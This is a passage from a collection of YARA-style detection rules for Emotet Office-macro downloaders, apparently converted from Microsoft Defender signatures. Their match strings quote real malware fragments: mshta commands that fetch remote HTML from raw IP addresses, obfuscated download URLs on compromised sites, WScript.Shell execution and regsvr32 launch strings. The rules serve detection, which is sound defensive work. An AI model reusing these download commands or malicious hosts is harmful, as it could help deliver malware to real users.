        $x_1_1 = "&\":/\"&\"/a\"&\"ac\"&\"l.c\"&\"o.i\"&\"n/i\"&\"m\"&\"a\"&\"ge\"&\"s/7\"&\"CM\"&\"c2\"&\"Nl\"&\"Oo\"&\"sD\"&\"4p\"&\"n6\"&\"lj" ascii //weight: 1
        $x_1_2 = "://a\"&\"lp\"&\"s\"&\"a\"&\"w\"&\"n\"&\"i\"&\"n\"&\"g\"&\"s.c\"&\"o.z\"&\"a/l\"&\"o\"&\"g\"&\"s/K\"&\"M\"&\"a\"&\"83" ascii //weight: 1
        $x_1_3 = "s://a\"&\"lr\"&\"o\"&\"t\"&\"e\"&\"c.c\"&\"o.u\"&\"k/w\"&\"p-i\"&\"n\"&\"c\"&\"lu\"&\"d\"&\"e\"&\"s/D\"&\"D\"&\"2\"&\"j\"&\"w\"&\"g\"&\"a\"&\"z\"&\"T\"&\"K\"&\"s\"&\"p/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMDB_2147811266_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMDB!MTB"
        threat_id = "2147811266"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd /c m^s^h^t^a h^t^tp:/^/0^x5^bf^07^6a^8/se/s.html" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMDB_2147811266_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMDB!MTB"
        threat_id = "2147811266"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c:\\programdata\\yhjlswle.vbs" ascii //weight: 1
        $x_1_2 = "c:\\programdata\\ughldskbhn.bat" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMDB_2147811266_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMDB!MTB"
        threat_id = "2147811266"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 79 73 57 6f 77 36 34 5c [0-47] 5c 57 69 6e 64 6f 77 73 5c [0-47] 72 22 26 22 65 67 22 26 22 73 76 22 26 22 72 33 32 2e 65 78 65 [0-47] 22 68 74 74 70 [0-255] 22 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMDB_2147811266_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMDB!MTB"
        threat_id = "2147811266"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd /c mshta http://91.240.118.168/fe/f.html" ascii //weight: 1
        $x_1_2 = "cmd /c mshta http://91.240.118.168/qw/as/se.html" ascii //weight: 1
        $x_1_3 = "cmd /c mshta http://91.240.118.168/zqqw/zaas/fe.html" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMDB_2147811266_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMDB!MTB"
        threat_id = "2147811266"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"ttp\"&\"s://new\"&\"afford\"&\"ableho\"&\"usin\"&\"gprogr\"&\"am.c\"&\"om/Nf\"&\"bpk\"&\"uF\"&\"XSS/Nh\"&\"f\"&\"mN.p\"&\"ng\"" ascii //weight: 1
        $x_1_2 = "ht\"&\"tp\"&\"s://mi\"&\"xdig\"&\"it\"&\"al.n\"&\"et/g\"&\"Zug\"&\"qif\"&\"RD/N\"&\"h\"&\"fm\"&\"N.p\"&\"ng\"" ascii //weight: 1
        $x_1_3 = "h\"&\"ttp\"&\"s://pt\"&\"naca\"&\"mar\"&\"a.o\"&\"rg.b\"&\"r/k\"&\"e6\"&\"iyv8\"&\"o0\"&\"Uf\"&\"S/N\"&\"hf\"&\"mN.p\"&\"ng\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_EXNZ_2147811498_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.EXNZ!MTB"
        threat_id = "2147811498"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6d 73 68 74 61 20 68 74 74 70 3a 2f 2f 39 31 2e 32 34 30 2e 31 31 38 2e 31 37 32 2f [0-4] 2f [0-4] 2f 73 65 2e 68 74 6d 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {6d 73 68 74 61 20 68 74 74 70 3a 2f 2f 39 31 2e 32 34 30 2e 31 31 38 2e 31 37 32 2f [0-4] 2f [0-4] 2f 66 65 2e 68 74 6d 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_EXNV_2147811499_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.EXNV!MTB"
        threat_id = "2147811499"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "91.240.118.168/qqqw/aaas/se.html" ascii //weight: 1
        $x_1_2 = "91.240.118.168/zqqw/zaas/fe.html" ascii //weight: 1
        $x_1_3 = "91.240.118.172/gg/ff/fe.html" ascii //weight: 1
        $x_1_4 = "91.240.118.172/gg/ff/se.html" ascii //weight: 1
        $x_1_5 = "91.240.118.172/ee/ss/se.html" ascii //weight: 1
        $x_1_6 = "91.240.118.172/cc/vv/fe.html" ascii //weight: 1
        $x_1_7 = "91.240.118.172/mm/nn/se.html" ascii //weight: 1
        $x_1_8 = "91.240.118.172/hh/hh.html" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_EXNY_2147811500_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.EXNY!MTB"
        threat_id = "2147811500"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3a 2f 2f 39 31 2e 32 5e 34 30 2e 31 31 38 2e 31 5e 36 38 2f [0-6] 2f [0-6] 2f [0-1] 73 [0-1] 65 2e [0-1] 68 [0-1] 74 [0-1] 6d [0-1] 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {3a 2f 2f 39 31 2e 32 5e 34 30 2e 31 31 38 2e 31 5e 36 38 2f [0-6] 2f [0-6] 2f [0-1] 66 [0-1] 65 2e [0-1] 68 [0-1] 74 [0-1] 6d [0-1] 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVD_2147811745_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVD!MTB"
        threat_id = "2147811745"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".CreateObject(\"Wscr\" + haslk + \"ipt.Sh\" + haslk & \"ell\", \"\")" ascii //weight: 1
        $x_1_2 = "fhwkuishdf.Exec UserForm1.Label1.Tag" ascii //weight: 1
        $x_1_3 = "ActiveSheet.Range(\"A1:A6\")" ascii //weight: 1
        $x_1_4 = ".Find(What:=\"\", SearchFormat:=True)" ascii //weight: 1
        $x_1_5 = "Replace(Cells(108, 2), \"Rpce\", \"\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_BOEX_2147811832_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.BOEX!MTB"
        threat_id = "2147811832"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://www.preferredsupports.com/cli/rK9sG2/" ascii //weight: 1
        $x_1_2 = "://homdecorstation.com/wazf7j/tP4PH/" ascii //weight: 1
        $x_1_3 = "://savagerefinishe rinc.com/cgi-bin/Ny1/" ascii //weight: 1
        $x_1_4 = "://haqsonsgroup.com/css/LBHRIu/" ascii //weight: 1
        $x_1_5 = "://lauramarshall.com/cgi-bin/sxS8ctblr/" ascii //weight: 1
        $x_1_6 = "://burialinsurancelab.com/q5kje9/K1mF/" ascii //weight: 1
        $x_1_7 = "://lealracecars.com/donnacox/fVqOYBzAUoU/" ascii //weight: 1
        $x_1_8 = "://edgetactical.ritabilisim.com/admin/2jKBEGDY0XpcgxF7f/" ascii //weight: 1
        $x_1_9 = "://4seasonsflorals.com/yhedjkl/BYwyXorqDywx/" ascii //weight: 1
        $x_1_10 = "://boldconsulting.info/bkzh6v/eqbAgc3oMGBsC5VDn1w/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_BOP_2147811844_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.BOP!MTB"
        threat_id = "2147811844"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FF = \"mshta http://91.240.118.172/ss/hh.html\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_BOP_2147811844_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.BOP!MTB"
        threat_id = "2147811844"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=RpcereRpceplaRpcece(\"Gswec:Gswe\\pGsweroGswegramGswedaGswetGswea\\jledshf.bGsweat\",\"Gswe\",\"\"" ascii //weight: 1
        $x_1_2 = "=wsRpceCriPRpcet.creRpceAteobRpceJEct(reRpceplaRpcece(\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVF_2147811849_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVF!MTB"
        threat_id = "2147811849"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "deardarcy.com/css/NHGyTTCK/\",\"" ascii //weight: 1
        $x_1_2 = "dijicom.net/error/5xzXdD/\",\"" ascii //weight: 1
        $x_1_3 = "tp.compribe.com/wp-admin/Pzgr8qexn/\",\"" ascii //weight: 1
        $x_1_4 = "hranenie.pereezd-24.com/1/uEibuIqhZi4oua/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVF_2147811849_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVF!MTB"
        threat_id = "2147811849"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"h\"&\"tt\"&\"p://f\"&\"ile\"&\"ca\"&\"bi\"&\"ne\"&\"t.d\"&\"igit\"&\"ale\"&\"cho\"&\"es.c\"&\"o.u\"&\"k/w\"&\"p-ad\"&\"m\"&\"in/N\"&\"C/\",\"" ascii //weight: 1
        $x_1_2 = "\"h\"&\"ttp\"&\"s:/\"&\"/gf\"&\"n\"&\"l.o\"&\"r\"&\"g/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/r\"&\"wd\"&\"BT\"&\"Lq\"&\"Af\"&\"NS\"&\"YW\"&\"3L/\",\"" ascii //weight: 1
        $x_1_3 = "\"h\"&\"tt\"&\"ps://h\"&\"ero\"&\"ica\"&\"nal\"&\"yt\"&\"ic\"&\"s.c\"&\"o\"&\"m/c\"&\"g\"&\"i-b\"&\"i\"&\"n/SB\"&\"M4\"&\"ayPj\"&\"OS\"&\"sa\"&\"clF\"&\"MK\"&\"m/\",\"" ascii //weight: 1
        $x_1_4 = "\"h\"&\"ttp\"&\"s:/\"&\"/infos\"&\"urde\"&\"so\"&\"nora.c\"&\"o\"&\"m/c\"&\"s\"&\"s/2\"&\"R\"&\"tVp\"&\"e\"&\"k/\",\"" ascii //weight: 1
        $x_1_5 = "\"h\"&\"tt\"&\"p\"&\"s:/\"&\"/os\"&\"kli\"&\"ni\"&\"kk\"&\"e\"&\"n.n\"&\"o/w\"&\"p-ad\"&\"m\"&\"in/z\"&\"M\"&\"2z\"&\"o0\"&\"qe\"&\"xb\"&\"8N\"&\"g/\",\"" ascii //weight: 1
        $x_1_6 = "\"h\"&\"tt\"&\"p://c\"&\"ab\"&\"le\"&\"eq\"&\"uip\"&\"me\"&\"nt\"&\"man\"&\"ag\"&\"em\"&\"en\"&\"tr\"&\"et\"&\"ur\"&\"ns.c\"&\"o\"&\"m/w\"&\"p-a\"&\"dm\"&\"i\"&\"n/JPi\"&\"vi\"&\"zx\"&\"mi\"&\"wo\"&\"9A\"&\"5Ow\"&\"ys/\",\"" ascii //weight: 1
        $x_1_7 = "\"h\"&\"tt\"&\"p:/\"&\"/no\"&\"v\"&\"aw\"&\"ed\"&\"ev\"&\"en\"&\"t.c\"&\"o\"&\"m/t\"&\"m\"&\"p/PA\"&\"0r\"&\"Bw\"&\"Fs\"&\"zI\"&\"py/\",\"" ascii //weight: 1
        $x_1_8 = "\"h\"&\"tt\"&\"ps://w\"&\"ww.a\"&\"lta\"&\"so\"&\"lu\"&\"ti\"&\"on\"&\"s.a\"&\"si\"&\"a/my\"&\"fil\"&\"es/m\"&\"yB\"&\"98\"&\"4E\"&\"nO\"&\"lS\"&\"JJ\"&\"4b\"&\"9/\",\"" ascii //weight: 1
        $x_1_9 = "\"h\"&\"tt\"&\"p://a\"&\"rz\"&\"ul\"&\"en\"&\"s.c\"&\"o\"&\"m/w\"&\"p-in\"&\"cl\"&\"ud\"&\"es/7g\"&\"yS\"&\"gT\"&\"g/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_BOQ_2147811974_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.BOQ!MTB"
        threat_id = "2147811974"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {65 28 22 63 [0-21] 3a [0-21] 5c 70 [0-21] 72 6f [0-21] 67 72 [0-21] 61 6d [0-21] 64 [0-21] 61 74 [0-21] 61 5c [0-32] 2e 62 61 74 22 2c 22 [0-21] 22 2c 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDC_2147812035_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDC!MTB"
        threat_id = "2147812035"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c:\\programdata\\oue4hjld.vbs" ascii //weight: 1
        $x_1_2 = "c:\\programdata\\bhnasleil.bat" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_BOR_2147812044_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.BOR!MTB"
        threat_id = "2147812044"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 79 73 57 6f 77 36 34 5c [0-21] 5c 57 69 6e 64 6f 77 73 5c [0-21] 2c 30 2c 30 29}  //weight: 1, accuracy: Low
        $x_1_2 = "D\"&\"l\"&\"lR\"&\"e\"&\"gister\"&\"Serve\"&\"r" ascii //weight: 1
        $x_1_3 = "D\"&\"l\"&\"lR\"&\"egister\"&\"Serve\"&\"r" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVG_2147812274_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVG!MTB"
        threat_id = "2147812274"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "d\"&\"ear\"&\"dar\"&\"cy.c\"&\"o\"&\"m/c\"&\"s\"&\"s/N\"&\"H\"&\"G\"&\"yT\"&\"TC\"&\"K/\",\"" ascii //weight: 1
        $x_1_2 = "d\"&\"ijico\"&\"m.n\"&\"et/e\"&\"rr\"&\"or/5x\"&\"zX\"&\"dD/\",\"" ascii //weight: 1
        $x_1_3 = "f\"&\"t\"&\"p.co\"&\"m\"&\"pr\"&\"ib\"&\"e.co\"&\"m/w\"&\"p-a\"&\"dm\"&\"in/P\"&\"zg\"&\"r8q\"&\"e\"&\"xn/\",\"" ascii //weight: 1
        $x_1_4 = "hr\"&\"an\"&\"e\"&\"ni\"&\"e.pe\"&\"re\"&\"ez\"&\"d-2\"&\"4.co\"&\"m/1/uEi\"&\"bu\"&\"Iqh\"&\"Zi4\"&\"oua/\"," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_BQQS_2147812321_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.BQQS!MTB"
        threat_id = "2147812321"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 46 20 3d 20 22 6d 73 68 74 61 20 68 74 74 70 [0-3] 2f 39 31 2e 32 [0-2] 2e 31 [0-2] 2e 31 [0-2] 2f [0-30] 68 68 2e 68 74 6d 6c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_BOS_2147812390_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.BOS!MTB"
        threat_id = "2147812390"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {65 28 22 63 [0-21] 3a [0-21] 5c 70 [0-21] 72 6f 67 72 [0-21] 61 6d 64 [0-21] 61 74 [0-21] 61 5c [0-18] 2e 62 [0-21] 61 74 22 2c 22 [0-21] 22 2c 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VSM_2147813408_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VSM!MTB"
        threat_id = "2147813408"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c:\\programdata\\bbiwjdf.vbs" ascii //weight: 1
        $x_1_2 = "lablace(dfjoleihdxdn,\"Gwei\",\"\"))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_LSM_2147813415_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.LSM!MTB"
        threat_id = "2147813415"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Worksheets(\"ouoi\")" ascii //weight: 1
        $x_1_2 = "Worksheets(\"vgu7y\")" ascii //weight: 1
        $x_1_3 = "Worksheets(\"nuui\")" ascii //weight: 1
        $x_1_4 = "Worksheets(\"njoi\")" ascii //weight: 1
        $x_1_5 = "Worksheets(\",hu8\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_BOEW_2147813431_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.BOEW!MTB"
        threat_id = "2147813431"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://littlesweet.co.uk/wp-a dmin/vko/" ascii //weight: 1
        $x_1_2 = "://stratusebsolutions.co.nz/wp-content/wyE Ej5jH8xq50rp1/" ascii //weight: 1
        $x_1_3 = "://wvfsbrasil.com.br/Acrasieae/LIYNOqCthfZuCWQz3/" ascii //weight: 1
        $x_1_4 = "://lydt.cc/wp-includes/6sfYo/" ascii //weight: 1
        $x_1_5 = "://lpm.fk.ub.ac.id /Fox-C/faKwS6p6/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDD_2147813494_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDD!MTB"
        threat_id = "2147813494"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://dalgahavuzu.com/pwkfky/LF0WU/" ascii //weight: 1
        $x_1_2 = "://dolphinsupremehavuzrobotu.com/yrrct/QcbxhqCQ/" ascii //weight: 1
        $x_1_3 = "://sandiegoinsuranceagents.com/cgi-bin/XK1VSXZddLdN/" ascii //weight: 1
        $x_1_4 = "://kinetekturk.com/e2ea69p/9U52O7jTobF8J/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ASS_2147813499_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ASS!MTB"
        threat_id = "2147813499"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://isguvenligiburada.com/xcg/uZSU/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ASS_2147813499_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ASS!MTB"
        threat_id = "2147813499"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 74 74 70 3a 2f 2f 73 75 6c 65 79 65 72 61 2e 63 6f 6d 2f 63 6f 6d 70 6f 6e 65 6e 74 73 2f [0-47] 2f}  //weight: 1, accuracy: Low
        $x_1_2 = {68 74 74 70 3a 2f 2f 73 6f 63 69 61 6c 6c 79 73 61 76 76 79 73 65 6f 2e 63 6f 6d 2f 50 69 6e 6e 61 63 6c 65 44 79 6e 61 6d 69 63 53 65 72 76 69 63 65 73 2f [0-47] 2f}  //weight: 1, accuracy: Low
        $x_1_3 = {68 74 74 70 3a 2f 2f 73 68 61 62 65 65 72 70 76 2e 61 74 77 65 62 70 61 67 65 73 2e 63 6f 6d 2f 63 73 73 2f [0-47] 2f}  //weight: 1, accuracy: Low
